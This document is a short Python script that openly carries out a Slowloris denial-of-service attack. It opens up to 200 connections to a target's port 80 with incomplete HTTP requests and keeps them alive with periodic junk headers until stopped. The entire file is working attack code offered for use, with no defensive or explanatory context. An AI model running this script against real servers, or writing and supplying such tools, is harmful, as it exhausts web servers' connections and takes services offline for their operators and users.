#!/usr/bin/env python3
import socket
import time
import sys

if len(sys.argv) < 2:
    print("Usage: python3 slowloris.py <target_ip>")
    sys.exit(1)

target = sys.argv[1]
port = 80
sockets = []

print(f"Starting Slowloris attack on {target}:{port}")

for i in range(200):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(b"GET / HTTP/1.1\r\n")
        sockets.append(s)
    except:
        break

print(f"Opened {len(sockets)} sockets")

try:
    while True:
        for s in sockets:
            try:
                s.send(b"X-a: b\r\n")
            except:
                sockets.remove(s)
        time.sleep(10)
except KeyboardInterrupt:
    print("Attack stopped")
